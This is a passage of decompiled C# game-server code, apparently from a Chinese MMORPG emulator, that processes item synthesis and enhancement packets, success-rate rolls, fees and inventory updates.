			byte[] array = Converter.hexStringToByte("AA557A002302510075003F010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(提示ID), 0, array, 12, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 14, 2);
			if (物品 != null)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(物品.物品位置), 0, array, 26, 4);
				System.Buffer.BlockCopy(物品.物品ID, 0, array, 30, 4);
				System.Buffer.BlockCopy(物品.物品属性, 0, array, 38, World.物品属性大小);
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes((long)钱数), 0, array, 98, 8);
			if (元宝合成开关 == 1)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes((long)World.元宝合成), 0, array, 103, 8);
			}
			else
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(0L), 0, array, 103, 8);
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public int 幸运符加成(int ID)
		{
			switch (ID)
			{
			case 800000003:
				return 5;
			case 800000004:
				return 10;
			case 800000005:
				return 15;
			default:
				return 0;
			case 1008001829:
				return 30;
			case 1008000136:
				return 25;
			case 800000029:
			case 1008000071:
				return 20;
			}
		}

		public void 合成系统(byte[] 封包数据, int 封包大小)
		{
			Converter.ToString(封包数据);
			int num = BitConverter.ToUInt16(封包数据, 10);
			int num2 = 封包数据[26];
			int num3 = 封包数据[14];
			int num4 = 封包数据[110];
			if (打开仓库中 || num >= 260)
			{
				try
				{
					封包修改(封包数据, 封包大小);
					打开仓库中 = true;
					byte[] array = Converter.hexStringToByte("AA557A000302510075003F010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(0L), 0, array, 98, 8);
					if (封包大小 > 29)
					{
						byte[] array2 = new byte[4];
						System.Buffer.BlockCopy(封包数据, 10, array2, 0, 4);
						HcItimesClass hcItimesClass32;
						HcItimesClass hcItimesClass69;
						switch (num)
						{
						case 69:
							try
							{
								HcItimesClass value29;
								if (合成物品表.TryGetValue(1, out value29))
								{
									装备栏包裹[value29.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value29.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
							}
							catch (Exception ex30)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex30.Message);
							}
							goto default;
						case 70:
							if (base.当前操作类型 == 103)
							{
								byte[] array25 = new byte[4];
								byte[] dst2 = new byte[4];
								System.Buffer.BlockCopy(封包数据, 14, array25, 0, 4);
								System.Buffer.BlockCopy(封包数据, 18, dst2, 0, 4);
								if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array25, 0)].物品ID, 0) != 0 && 合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass95 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass95 = 合成物品表[1];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass95.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass95.物品全局ID, 0))
									{
										if (装备栏包裹[hcItimesClass95.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass95.位置]);
										}
										else
										{
											hcItimesClass95.强化属性阶段();
											hcItimesClass95.阶段类型 = 0;
											hcItimesClass95.阶段数量 = 0;
											hcItimesClass95.设置阶段属性();
											减去物品(BitConverter.ToInt32(array25, 0), 1);
											if (BitConverter.ToInt32(装备栏包裹[hcItimesClass95.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass95.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass95.物品全局ID, 0))
											{
												减去物品(hcItimesClass95.位置, 1);
												增加物品(hcItimesClass95.物品全局ID, hcItimesClass95.物品id, hcItimesClass95.位置, hcItimesClass95.物品数量, hcItimesClass95.物品属性);
											}
											装备栏包裹[hcItimesClass95.位置].锁定 = false;
											合成物品表.Clear();
											合成系统解锁();
											元宝合成开关 = 0;
											合成提示(num, 1, 0, 装备栏包裹[hcItimesClass95.位置]);
										}
									}
								}
							}
							goto default;
						case 71:
							try
							{
								ItmeClass value86;
								if (base.当前操作类型 == 103 && !合成物品表.ContainsKey(1) && !装备栏包裹[num2].物品绑定 && 装备栏包裹[num2].FLD_属性类型 != 0 && !装备栏包裹[num2].物品绑定 && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value86) || value86.FLD_RESIDE2 == 1 || value86.FLD_RESIDE2 == 4))
								{
									HcItimesClass hcItimesClass110 = new HcItimesClass();
									hcItimesClass110.位置 = num2;
									hcItimesClass110.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass110);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex85)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex85.Message);
							}
							goto default;
						case 39:
							try
							{
								HcItimesClass value81;
								if (合成物品表.TryGetValue(1, out value81))
								{
									装备栏包裹[value81.位置].锁定 = false;
								}
								if (合成物品表.TryGetValue(2, out value81))
								{
									装备栏包裹[value81.位置].锁定 = false;
								}
								if (合成物品表.TryGetValue(3, out value81))
								{
									装备栏包裹[value81.位置].锁定 = false;
								}
								if (合成物品表.TryGetValue(4, out value81))
								{
									装备栏包裹[value81.位置].锁定 = false;
								}
								元宝合成开关 = 0;
								合成物品表.Clear();
								合成系统解锁();
								合成提示(num, 1, 0, 装备栏包裹[value81.位置]);
							}
							catch (Exception ex79)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 再造合成石-取消 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex79.Message);
							}
							goto default;
						case 40:
							try
							{
								byte[] array26;
								int num66;
								HcItimesClass hcItimesClass101;
								HcItimesClass hcItimesClass102;
								HcItimesClass hcItimesClass103;
								HcItimesClass hcItimesClass104;
								HcItimesClass hcItimesClass105;
								ItmeClass value83;
								if (base.当前操作类型 == 101)
								{
									array26 = new byte[4];
									byte[] dst3 = new byte[4];
									System.Buffer.BlockCopy(封包数据, 14, array26, 0, 4);
									System.Buffer.BlockCopy(封包数据, 18, dst3, 0, 4);
									num66 = BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array26, 0)].物品ID, 0);
									if (num66 != 0 && 合成物品表.Count > 0)
									{
										hcItimesClass101 = null;
										hcItimesClass102 = null;
										hcItimesClass103 = null;
										hcItimesClass104 = null;
										hcItimesClass105 = null;
										if (合成物品表.ContainsKey(1))
										{
											hcItimesClass101 = 合成物品表[1];
										}
										if (合成物品表.ContainsKey(2))
										{
											hcItimesClass102 = 合成物品表[2];
										}
										if (合成物品表.ContainsKey(3))
										{
											hcItimesClass103 = 合成物品表[3];
										}
										if (合成物品表.ContainsKey(4))
										{
											hcItimesClass104 = 合成物品表[4];
										}
										if (合成物品表.ContainsKey(5))
										{
											hcItimesClass105 = 合成物品表[5];
										}
										if (BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
											合成物品表.Clear();
										}
										else if (hcItimesClass102 != null)
										{
											if (hcItimesClass102 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass102.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass102.物品全局ID, 0))
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass102.位置]);
												合成物品表.Clear();
											}
											else if (hcItimesClass103 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass103.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass103.物品全局ID, 0))
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass103.位置]);
												合成物品表.Clear();
											}
											else if (hcItimesClass104 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass104.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass104.物品全局ID, 0))
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass104.位置]);
												合成物品表.Clear();
											}
											else if (hcItimesClass105 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass105.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass105.物品全局ID, 0))
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass105.位置]);
												合成物品表.Clear();
											}
											else
											{
												hcItimesClass101.得到属性();
												hcItimesClass101.强化属性阶段();
												if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass101.物品id, 0), out value83))
												{
													合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
													合成物品表.Clear();
												}
												else if (value83.FLD_RESIDE2 != 1 && value83.FLD_RESIDE2 != 2 && value83.FLD_RESIDE2 != 4 && value83.FLD_RESIDE2 != 5 && value83.FLD_RESIDE2 != 6 && value83.FLD_RESIDE2 != 14 && value83.FLD_RESIDE2 != 23 && value83.FLD_RESIDE2 != 24 && value83.FLD_RESIDE2 != 25)
												{
													合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
													合成物品表.Clear();
												}
												else if (value83.FLD_RESIDE2 == 4)
												{
													if (num66 == 1008000111 || num66 == 1008000112 || num66 == 1008000113 || num66 == 1008001057 || num66 == 1008001352)
													{
														goto IL_0a66;
													}
													合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
												}
												else
												{
													if (num66 == 1008000114 || num66 == 1008000115 || num66 == 1008000116 || num66 == 1008001058 || num66 == 1008001353)
													{
														goto IL_0a66;
													}
													合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
												}
											}
										}
									}
								}
								goto end_IL_0645;
								IL_0a66:
								if ((num66 == 1008000111 || num66 == 1008000114) && 装备栏包裹[hcItimesClass101.位置].FLD_强化数量 != 5)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
								}
								else if ((num66 == 1008001352 || num66 == 1008001353) && 装备栏包裹[hcItimesClass101.位置].FLD_强化数量 >= 10)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
								}
								else if (装备栏包裹[hcItimesClass101.位置].物品绑定)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
									合成物品表.Clear();
								}
								else if (hcItimesClass101.强化数量 >= 15)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
									合成物品表.Clear();
								}
								else if (value83.FLD_LEVEL >= 130)
								{
									if (hcItimesClass102 != null && BitConverter.ToInt32(hcItimesClass102.物品id, 0) != 800000060)
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass103 != null && BitConverter.ToInt32(hcItimesClass103.物品id, 0) != 800000060)
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
										合成物品表.Clear();
									}
									else
									{
										if (hcItimesClass104 == null || BitConverter.ToInt32(hcItimesClass104.物品id, 0) == 800000060)
										{
											goto IL_0cee;
										}
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
										合成物品表.Clear();
									}
								}
								else if (hcItimesClass102 != null && BitConverter.ToInt32(hcItimesClass102.物品id, 0) != 800000006)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
									合成物品表.Clear();
								}
								else if (hcItimesClass103 != null && BitConverter.ToInt32(hcItimesClass103.物品id, 0) != 800000006)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
									合成物品表.Clear();
								}
								else
								{
									if (hcItimesClass104 == null || BitConverter.ToInt32(hcItimesClass104.物品id, 0) == 800000006)
									{
										goto IL_0cee;
									}
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
									合成物品表.Clear();
								}
								goto end_IL_0645;
								IL_0d48:
								double num67 = RNG.Next(1, 110);
								if (hcItimesClass105 != null)
								{
									num67 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass105.物品id, 0));
								}
								if (元宝合成开关 == 1)
								{
									num67 += 5.0;
								}
								if (base.FLD_VIP == 1)
								{
									num67 += 100.0 * World.VIP合成率增加百分比;
								}
								if (World.至尊强化率 != 0.0)
								{
									num67 += World.至尊强化率;
								}
								if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
								{
									num67 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
								}
								if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
								{
									num67 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
								}
								if (hcItimesClass101.属性1.属性数量 + hcItimesClass101.属性2.属性数量 != 0 && hcItimesClass103 == null)
								{
									系统提示("石头放少了最少得放2个。");
								}
								else if (hcItimesClass101.属性1.属性数量 + hcItimesClass101.属性2.属性数量 != 0 && hcItimesClass101.属性3.属性数量 + hcItimesClass101.属性4.属性数量 != 0 && hcItimesClass104 == null)
								{
									系统提示("石头放少了最少得放3个。");
								}
								else
								{
									switch (num66)
									{
									default:
										if (num66 == 1008001057 || num66 == 1008001058)
										{
											num67 += World.道具强化概率;
										}
										if ((hcItimesClass101.强化数量 == 10 && num67 >= 100.0 - World.至尊取玉强11) || (hcItimesClass101.强化数量 == 11 && num67 >= 100.0 - World.至尊取玉强12) || (hcItimesClass101.强化数量 == 12 && num67 >= 100.0 - World.至尊取玉强13) || (hcItimesClass101.强化数量 == 13 && !(num67 < 100.0 - World.至尊取玉强14)) || ((hcItimesClass101.强化数量 == 14 && !(num67 < 100.0 - World.至尊取玉强15)) ? true : false))
										{
											hcItimesClass101.强化类型 = ((value83.FLD_RESIDE2 == 4) ? 1 : 2);
											switch (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array26, 0)].物品ID, 0))
											{
											case 1008000111:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008000112:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008000113:
											{
												Random random3 = new Random(DateTime.Now.Millisecond);
												hcItimesClass101.强化数量 += random3.Next(1, 3);
												if (hcItimesClass101.强化数量 > 10)
												{
													hcItimesClass101.强化数量 = 10;
												}
												break;
											}
											case 1008000114:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008000115:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008000116:
											{
												Random random2 = new Random(DateTime.Now.Millisecond);
												hcItimesClass101.强化数量 += random2.Next(1, 3);
												if (hcItimesClass101.强化数量 > 10)
												{
													hcItimesClass101.强化数量 = 10;
												}
												break;
											}
											case 1008000024:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008000023:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008001058:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008001057:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008001353:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											case 1008001352:
											{
												int num68 = ++hcItimesClass101.强化数量;
												break;
											}
											}
											if (hcItimesClass101.强化数量 > 15)
											{
												hcItimesClass101.强化数量 = 15;
											}
											hcItimesClass101.设置阶段属性();
											减去物品(BitConverter.ToInt32(array26, 0), 1);
											if (hcItimesClass101.强化数量 >= 10)
											{
												发送快报(base.UserName, hcItimesClass101.强化数量, hcItimesClass101.物品id, base.Player_Zx);
											}
											if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
											{
												减去物品(hcItimesClass101.位置, 1);
												增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
											}
											装备栏包裹[hcItimesClass101.位置].锁定 = false;
											RxjhClass.合成记录(base.Userid, base.UserName, value83.ItmeNAME, num, 装备栏包裹[BitConverter.ToInt32(array26, 0)].得到物品名称(), "成功", 装备栏包裹[hcItimesClass101.位置]);
											合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass101.位置]);
										}
										else
										{
											RxjhClass.合成记录(base.Userid, base.UserName, value83.ItmeNAME, num, 装备栏包裹[BitConverter.ToInt32(array26, 0)].得到物品名称(), "失败", 装备栏包裹[hcItimesClass101.位置]);
											switch (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array26, 0)].物品ID, 0))
											{
											case 1008000024:
												hcItimesClass101.强化类型 = 0;
												hcItimesClass101.强化数量 = 0;
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											case 1008000023:
												hcItimesClass101.强化类型 = 0;
												hcItimesClass101.强化数量 = 0;
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											case 1008001058:
											{
												int num68 = --hcItimesClass101.强化数量;
												if (hcItimesClass101.强化数量 <= 0)
												{
													hcItimesClass101.强化数量 = 0;
													hcItimesClass101.强化类型 = 0;
												}
												if (hcItimesClass101.强化数量 == 9)
												{
													hcItimesClass101.强化数量 = 10;
												}
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											}
											case 1008001057:
											{
												int num68 = --hcItimesClass101.强化数量;
												if (hcItimesClass101.强化数量 <= 0)
												{
													hcItimesClass101.强化数量 = 0;
													hcItimesClass101.强化类型 = 0;
												}
												if (hcItimesClass101.强化数量 == 9)
												{
													hcItimesClass101.强化数量 = 10;
												}
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											}
											case 1008000112:
											{
												int num68 = --hcItimesClass101.强化数量;
												if (hcItimesClass101.强化数量 <= 0)
												{
													hcItimesClass101.强化数量 = 0;
													hcItimesClass101.强化类型 = 0;
												}
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											}
											case 1008000113:
												hcItimesClass101.强化类型 = 0;
												hcItimesClass101.强化数量 = 0;
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											case 1008000115:
											{
												int num68 = --hcItimesClass101.强化数量;
												if (hcItimesClass101.强化数量 <= 0)
												{
													hcItimesClass101.强化数量 = 0;
													hcItimesClass101.强化类型 = 0;
												}
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											}
											case 1008000116:
												hcItimesClass101.强化类型 = 0;
												hcItimesClass101.强化数量 = 0;
												hcItimesClass101.设置阶段属性();
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass101.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
												{
													减去物品(hcItimesClass101.位置, 1);
													增加物品(hcItimesClass101.物品全局ID, hcItimesClass101.物品id, hcItimesClass101.位置, hcItimesClass101.物品数量, hcItimesClass101.物品属性);
												}
												break;
											}
											合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass101.位置]);
											减去物品(BitConverter.ToInt32(array26, 0), 1);
										}
										减去物品(hcItimesClass102.位置, 1);
										if (hcItimesClass103 != null)
										{
											减去物品(hcItimesClass103.位置, 1);
										}
										if (hcItimesClass104 != null)
										{
											减去物品(hcItimesClass104.位置, 1);
										}
										if (hcItimesClass105 != null)
										{
											减去物品(hcItimesClass105.位置, 1);
										}
										合成物品表.Clear();
										合成系统解锁();
										元宝合成开关 = 0;
										合成手续费 = 0;
										打开仓库中 = false;
										break;
									}
								}
								goto end_IL_0645;
								IL_0cee:
								if (合成手续费 <= 0)
								{
									goto IL_0d48;
								}
								if (base.Player_Money >= 合成手续费)
								{
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
									goto IL_0d48;
								}
								合成提示(11, 4, 0, 装备栏包裹[hcItimesClass101.位置]);
								合成物品表.Clear();
								end_IL_0645:;
							}
							catch (Exception ex82)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex82.Message);
								Form1.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex82.StackTrace);
							}
							goto default;
						case 41:
							try
							{
								ItmeClass value98;
								int num75;
								if (base.当前操作类型 == 101 && !合成物品表.ContainsKey(1))
								{
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else
									{
										byte[] array27 = new byte[4];
										System.Buffer.BlockCopy(封包数据, 14, array27, 0, 4);
										if (World.Itme.TryGetValue((int)装备栏包裹[num2].Get物品ID, out value98))
										{
											if (value98.FLD_RESIDE2 == 12)
											{
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else if (装备栏包裹[num2].FLD_强化数量 < 15)
											{
												if (value98.FLD_RESIDE2 != 1 && value98.FLD_RESIDE2 != 2 && value98.FLD_RESIDE2 != 4 && value98.FLD_RESIDE2 != 5 && value98.FLD_RESIDE2 != 6 && value98.FLD_RESIDE2 != 14)
												{
													合成提示(num, 5, 0, 装备栏包裹[num2]);
												}
												else
												{
													num75 = (int)装备栏包裹[BitConverter.ToInt32(array27, 0)].Get物品ID;
													if (value98.FLD_RESIDE2 == 4)
													{
														if (num75 == 1008000111 || num75 == 1008000112 || num75 == 1008000113 || num75 == 1008001057 || num75 == 1008001352)
														{
															goto IL_1bd1;
														}
														合成提示(num, 5, 0, 装备栏包裹[num2]);
													}
													else
													{
														if (num75 == 1008000114 || num75 == 1008000115 || num75 == 1008000116 || num75 == 1008001058 || num75 == 1008001353)
														{
															goto IL_1bd1;
														}
														合成提示(num, 5, 0, 装备栏包裹[num2]);
													}
												}
											}
										}
									}
								}
								goto end_IL_1a28;
								IL_1bd1:
								if ((num75 == 1008000111 || num75 == 1008000114) && 装备栏包裹[num2].FLD_强化数量 != 5)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else if ((num75 == 1008001352 || num75 == 1008001353) && 装备栏包裹[num2].FLD_强化数量 >= 10)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else
								{
									int 钱数6 = 合成手续费 = 计算合成强化费用(value98, num2, num);
									HcItimesClass hcItimesClass119 = new HcItimesClass();
									hcItimesClass119.位置 = num2;
									hcItimesClass119.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass119);
									合成提示(num, 1, 钱数6, 装备栏包裹[num2]);
								}
								end_IL_1a28:;
							}
							catch (Exception ex94)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex94.Message);
							}
							goto default;
						case 42:
							try
							{
								HcItimesClass hcItimesClass96;
								if (base.当前操作类型 == 101 && !合成物品表.ContainsKey(4))
								{
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass96 = 合成物品表[1];
										ItmeClass value79;
										if (合成物品表.Count == 0)
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 1 && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass96.物品id, 0), out value79))
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000006 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000060)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else if (value79.FLD_LEVEL >= 130)
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 800000060)
												{
													goto IL_1e4d;
												}
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 800000006)
												{
													goto IL_1e4d;
												}
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
								goto end_IL_1cfe;
								IL_1f15:
								HcItimesClass hcItimesClass97;
								if (hcItimesClass96.属性1.属性数量 + hcItimesClass96.属性2.属性数量 != 0 && hcItimesClass96.属性3.属性数量 + hcItimesClass96.属性4.属性数量 != 0 && BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 3 && !合成物品表.ContainsKey(4))
								{
									合成物品表.Add(4, hcItimesClass97);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
								goto end_IL_1cfe;
								IL_1e4d:
								hcItimesClass97 = new HcItimesClass();
								hcItimesClass97.位置 = num2;
								hcItimesClass97.物品 = 装备栏包裹[num2].物品_byte;
								装备栏包裹[num2].锁定 = true;
								if (!合成物品表.ContainsKey(2))
								{
									合成物品表.Add(2, hcItimesClass97);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
								hcItimesClass96.得到属性();
								if (hcItimesClass96.属性1.属性数量 + hcItimesClass96.属性2.属性数量 == 0)
								{
									goto IL_1f15;
								}
								if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 2)
								{
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.Add(3, hcItimesClass97);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
									goto IL_1f15;
								}
								end_IL_1cfe:;
							}
							catch (Exception ex75)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex75.Message);
							}
							goto default;
						case 43:
							try
							{
								if (base.当前操作类型 == 101)
								{
									if (合成物品表.Count == 0)
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (!合成物品表.ContainsKey(5))
									{
										HcItimesClass hcItimesClass111 = new HcItimesClass();
										hcItimesClass111.位置 = num2;
										hcItimesClass111.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(5, hcItimesClass111);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex88)
